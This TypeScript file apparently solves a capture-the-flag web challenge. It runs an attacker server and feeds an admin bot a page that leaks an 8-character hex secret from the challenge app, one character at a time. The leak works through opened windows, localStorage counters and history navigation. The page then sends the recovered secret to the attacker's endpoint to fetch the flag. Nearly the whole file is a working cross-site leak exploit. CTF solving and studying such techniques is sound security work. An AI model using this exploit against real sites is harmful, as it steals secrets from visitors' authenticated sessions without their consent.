import { Hono } from "hono"
import { join } from "node:path"

const app = new Hono()
const CHALL_URI = "http://localhost:4000"
const ATTACKER_URI = "http://localhost:3000"

app.get('/r', async (c) => {
  const secret = c.req.query('secret')
  if (secret) {
    const r = await fetch(`${CHALL_URI}/flag?${new URLSearchParams({ secret })}`)
    if (r.ok) console.log(`[SUCCESS] flag is ${(await r.text()).trim()}`)
    else console.log(`[ERR] secret is ${secret}`)
  }
  return c.text('ok')
})

app.get('/guess', (c) => {
  const x = c.req.query('x')
  return c.html(`
  <script>
    (async function(){
      const sleep = x => new Promise(r => setTimeout(r, x))
      const cnt = localStorage.getItem('${x}')
      if(cnt) localStorage.setItem('${x}', parseInt(cnt) + 1)
      else {
        localStorage.setItem('${x}', 1)
        await sleep(300)
        history.go(-1)
      }
    })()
  </script>
  `)
})

app.get('/', (c) => {
  // Pacify RelatedActiveContentsExist and BrowsingInstanceNotSwapped
  c.header('Cross-Origin-Opener-Policy', 'same-origin')
  return c.html(`
    <script>
    (async function() {
      // SECRET = secrets.token_hex(4)
      let secret = ''
      const charset = '0123456789abcdef'.split('')
      const sleep = x => new Promise(r => setTimeout(r, x))
      while(secret.length < 8) {
        for(let char of charset) {
          open("${CHALL_URI}/append?" + new URLSearchParams({
            content: secret + char,
            url: "${ATTACKER_URI}/guess?x=" + secret + char
          }))
        }
        await sleep(2000)
        for(let char of charset) {
          if(localStorage.getItem(secret + char) === '1') {
            secret += char
            break
          }
        }
      }
      await fetch('${ATTACKER_URI}/r?' + new URLSearchParams({ secret }))
    })()
  </script>`)
})


async function visit(url: string) {
  await Bun.$`node adminbot.js "${url}"`.cwd(join(__dirname, '..'))
}

Bun.serve({
  fetch: app.fetch,
  port: 3000
})

await visit(ATTACKER_URI)

